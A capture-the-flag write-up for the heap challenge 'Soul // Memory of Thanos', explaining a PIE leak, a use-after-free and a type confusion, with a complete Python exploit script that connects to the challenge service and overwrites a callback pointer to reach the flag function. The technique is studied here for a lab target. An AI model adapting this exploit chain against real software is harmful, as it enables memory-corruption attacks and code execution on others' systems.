---
title: "Soul // Memory of Thanos"
category: "Pwn"
tags: ["use-after-free", "type-confusion", "pie-leak", "function-pointer-overwrite", "heap"]
solve_date: "2026-10-09"
language: "en"
---

# Soul // Memory of Thanos

**Flag:** `OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}`
**Service:** `145.239.142.129:1339`, banner `SOUL ARCHIVE v6.0`. **Artifact:** `soul.zip` (1074646 B), containing `soul_archive` (21720 B), `libc.so.6` (2220400 B), `ld-linux-x86-64.so.2` (236616 B).

## Challenge

`SOUL ARCHIVE v6.0` is a 64-bit heap menu (Hard, 500 points, 0 solves at the time) exposing six operations: Capture soul, Inspect soul, Merge souls, Erase soul, Transfer soul (Record Log), Exit. The program only prints the flag inside `soul_ascension()`, which is guarded by four state conditions plus a specific essence value, and no valid call path reaches it.

## Analysis

`readelf -h` returns `Type: DYN (Position-Independent Executable file)` and `r2 -q -c "iI~pic" soul_archive` returns `pic true`; `readelf -dW` shows `FLAGS BIND_NOW` together with a `GNU_RELRO` segment, `GNU_STACK` is `RW` only (NX), and the binary calls `__stack_chk_fail`. These protections do not prevent the heap UAF/type-confusion chain below.

Every soul is allocated with `malloc(0x40)` — both in `capture_soul` (call at `0x1937`) and in `transfer_soul` (call at `0x1f1a`) — so the record object and a soul share the same size bin. The fields used:

| Offset | Content |
|---|---|
| `+0x00` | name (record: `read_str` with size `0x18`) |
| `+0x20` | essence |
| `+0x28` | type |
| `+0x30` | consume callback |
| `+0x38` | inspect callback |

Three primitives:

1. **PIE leak.** `inspect` prints `Inspect Callback: %p`, i.e. the `+0x38` field itself. That value comes from a callback table indexed by `type`; for `type = 4` (Titan) it is `inspect_titan` at offset `0x144b`, so `base = leak - 0x144b`. The script asserts that `base` is page-aligned before using it.
2. **Use-after-free.** `merge_souls` ends with `call sym.imp.free` at `0x1e05` and afterwards only increments `merges_performed` and prints a message; `archive[]` (`.bss` at `0x5060`) keeps the pointer to the freed soul of the dissolved vessel.
3. **Type confusion.** `transfer_soul` calls `malloc(0x40)`, which recycles the chunk freed above, and then writes fields through `strtoull(..., 0x10)`: `+0x20` (prompt `Timestamp (hex e.g. 1337)`), `+0x28` (prompt `Raw Entropy / Essence (hex)`), `+0x38` and `+0x30` (prompt `Audit Callback Address (hex, 0 for default)`, stores at `0x2098` and `0x20a4`). The caller therefore controls the callback pointer of a soul that is still referenced from `archive[]`.

The gate inside `soul_ascension` (offset `0x14fb`) reads four globals; `aa; axt @ sym.soul_ascension` returns no cross-reference, so the function is only reachable through a callback pointer:

```text
0x0000151a  mov eax, dword [obj.total_captured]   ; cmp eax, 5 ; jle fail
0x00001529  mov eax, dword [obj.merges_performed] ; cmp eax, 3 ; jne fail
0x00001538  mov eax, dword [obj.souls_erased]     ; cmp eax, 1 ; jne fail
0x0000155a  movabs rdx, 0x50574e534f554c53        ; cmp rax, rdx ; jne fail
```

The flag is not stored in `.rodata` but assembled fragment by fragment with `movabs` inside `soul_ascension` (`0x15a9`, `0x15b3`, `0x15c5`, `0x15cf`, `0x15e1` holding `'OWASP{Th'`, `'4n0s_S0u'`, `'l_Mem0ry'`, `'_UAF_Typ'`, `'e_Confus'`), so the string is partly readable statically; the complete value is confirmed by the service response.

## Solution

The sequence that satisfies the gate and lands the callback on the right target:

1. **Capture 6 souls** with `type = 4` and essence `1` so that `total_captured = 6 > 5`.
2. **Inspect vessel 0** to obtain `base + 0x144b` and therefore the PIE base.
3. **Erase vessel 5** so that `souls_erased = 1`.
4. **Merge `(0,1)`, `(0,2)`, `(0,3)`** so that `merges_performed = 3`; each merge frees the source soul, and the chunk of vessel 3 ends up at the head of the `0x40` tcache bin.
5. **Transfer soul** with `Timestamp = 50574e534f554c53` (essence), `Raw Entropy / Essence = 1004` (type) and `Audit Callback = base + 0x14fb`. `malloc(0x40)` recycles exactly the chunk of vessel 3, so `archive[3]` becomes a structurally valid soul whose inspect callback points at `soul_ascension` and whose essence is the magic value.
6. **Inspect vessel 3** → `callback(soul)` jumps into `soul_ascension`; all four conditions hold and the flag is printed.

Two independent runs both produced the flag. The inspect response is stored verbatim in `ascension.bin` (810 B):

```text
--- Vessel [3] ---
Soul Name: VOID
Type: 0x1004
Essence: 0x50574e534f554c53
Inspect Callback: 0x616cd492c4fb
```

`0x616cd492c4fb - 0x14fb = 0x616cd492b000` is the leaked base of that run; line 11 of the same file is the flag.

## Result

```text
OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}
```

The flag was read directly from the challenge service and is stored in `ascension.bin` (line 11). The flag was accepted by the platform; the acceptance response is recorded in the working session.

## Reproduce

Requires Python 3 (`socket`, `re`) and the service at `145.239.142.129:1339`. The script derives the PIE base from the live connection, so there is no need to run the binary locally under the shipped `ld-linux-x86-64.so.2` and `libc.so.6`. Save the block below as `soul_exploit.py`, create a `scratch/` directory next to it, and run `python soul_exploit.py`.

```python
import re
import socket
import sys

HOST, PORT = "145.239.142.129", 1339

# offsets inside the 0x40-byte soul struct
OFF_NAME = 0x00
OFF_ESSENCE = 0x20
OFF_TYPE = 0x28
OFF_CONSUME = 0x30
OFF_INSPECT = 0x38

INSPECT_OFFSET = {1: 0x13A9, 2: 0x13DF, 3: 0x1415, 4: 0x144B, 5: 0x1481}
ASCENSION = 0x14FB
ESSENCE_MAGIC = 0x50574E534F554C53  # "SLUOSNWP"

MENU = b"> "


def connect():
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(20)
    return s


def ru(s, token):
    """Accumulate until token appears; token must be the tail of the reply."""
    buf = b""
    while token not in buf:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    return buf


def step(s, data, expect):
    s.sendall(data)
    out = ru(s, expect)
    if expect not in out:
        raise RuntimeError("missing %r; got %r" % (expect, out))
    return out


def capture(s, name, soul_type, essence):
    step(s, b"1\n", b"Soul name: ")
    step(s, name + b"\n", b"Type: ")
    step(s, str(soul_type).encode() + b"\n", b"Initial Essence (hex value e.g. 1000): ")
    return step(s, essence.encode() + b"\n", MENU)


def inspect(s, idx):
    step(s, b"2\n", b"Enter vessel index (0-7): ")
    return step(s, str(idx).encode() + b"\n", MENU)


def merge(s, a, b):
    step(s, b"3\n", b"First vessel index to merge: ")
    step(s, str(a).encode() + b"\n", b"Second vessel index to merge: ")
    return step(s, str(b).encode() + b"\n", MENU)


def erase(s, idx):
    step(s, b"4\n", b"Enter vessel index to erase (0-7): ")
    return step(s, str(idx).encode() + b"\n", MENU)


def transfer(s, realm, tid, flags, timestamp, raw, callback):
    step(s, b"5\n", b"Realm of origin: ")
    step(s, realm + b"\n", b"Transfer ID (decimal): ")
    step(s, str(tid).encode() + b"\n", b"Entropy Flags (decimal): ")
    step(s, str(flags).encode() + b"\n", b"Timestamp (hex e.g. 1337): ")
    step(s, timestamp.encode() + b"\n", b"Raw Entropy / Essence (hex): ")
    step(s, raw.encode() + b"\n", b"Audit Callback Address (hex, 0 for default): ")
    return step(s, callback.encode() + b"\n", MENU)


def main():
    s = connect()
    ru(s, MENU)

    # six souls -> total_captured = 6 (> 5)
    names = [b"GAMORA", b"NEBULA", b"DRAX", b"MANTIS", b"STARLORD", b"WANDA"]
    for i, n in enumerate(names):
        out = capture(s, n, 4, "1")
        if b"registered" not in out:
            raise RuntimeError("capture %d failed: %r" % (i, out))

    # PIE leak: soul 0 is a Titan -> inspect callback = base + 0x144b
    out = inspect(s, 0)
    m = re.search(rb"Inspect Callback: 0x([0-9a-fA-F]+)", out)
    if not m:
        raise RuntimeError("no leak: %r" % out)
    leak = int(m.group(1), 16)
    base = leak - INSPECT_OFFSET[4]
    if base & 0xFFF:
        raise RuntimeError("base not page aligned: %x" % base)
    print("[*] inspect callback leak = %#x" % leak)
    print("[*] pie base = %#x  -> soul_ascension = %#x" % (base, base + ASCENSION))

    # exactly one erase
    erase(s, 5)

    # three merges: each frees the source soul but leaves archive[idx] dangling.
    # chunk of vessel 3 ends up at the head of the tcache bin.
    for victim in (1, 2, 3):
        merge(s, 0, victim)

    # this allocation recycles the freed chunk of vessel 3 and lets us write
    # every struct field, including the inspect callback.
    out = transfer(
        s,
        b"VOID",
        0,
        0,
        hex(ESSENCE_MAGIC),           # essence (Timestamp prompt -> +0x20)
        hex(0x1004),                  # type     (Raw prompt      -> +0x28)
        hex(base + ASCENSION),        # callback (+0x38 and +0x30)
    )
    rec = re.search(rb"0x[0-9a-f]+", out)
    print("[*] record log: %r" % out)

    out = inspect(s, 3)
    with open("scratch/ascension.bin", "wb") as fh:
        fh.write(out)
    sys.stdout.buffer.write(b"[*] inspect vessel 3:\n" + out + b"\n")
    sys.stdout.flush()

    flag = re.search(rb"OWASP\{[^}]+\}", out)
    print("[+] FLAG: %s" % flag.group().decode() if flag else "[-] no flag in output")
    s.close()


if __name__ == "__main__":
    sys.exit(main())
```

Static checks on the artifact:

```console
$ r2 -q -c "iI~pic" soul_archive
$ r2 -q -c "aa; axt @ sym.imp.malloc" soul_archive
$ r2 -q -c "aa; axt @ sym.imp.free" soul_archive
$ r2 -q -c "aa; pd 260 @ 0x14fb" soul_archive
```

The offsets `0x144b`, `0x14fb` and the `INSPECT_OFFSET` table come from the symbol table of the shipped `soul_archive`; re-read them if the service ships a different binary.
